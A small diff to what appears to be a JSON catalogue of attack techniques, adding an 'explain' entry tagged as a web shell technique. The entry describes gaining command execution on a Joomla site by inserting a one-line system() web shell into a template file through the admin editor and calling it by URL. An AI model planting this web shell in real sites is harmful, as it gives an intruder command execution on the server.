@@ -88,5 +88,6 @@
       "MITRE T1505.003",
       "OWASP A04:2021"
     ]
-  }
+  },
+  "explain": "Turns Joomla admin access into RCE by editing a template file:\n  system($_GET['<rand>']);   add this to a template PHP file (e.g. error.php) via Templates > Customise\nJoomla lets admins edit template source, so injecting a system() call and then requesting /templates/<theme>/error.php?<rand>=id runs commands as the web-server user."
 }
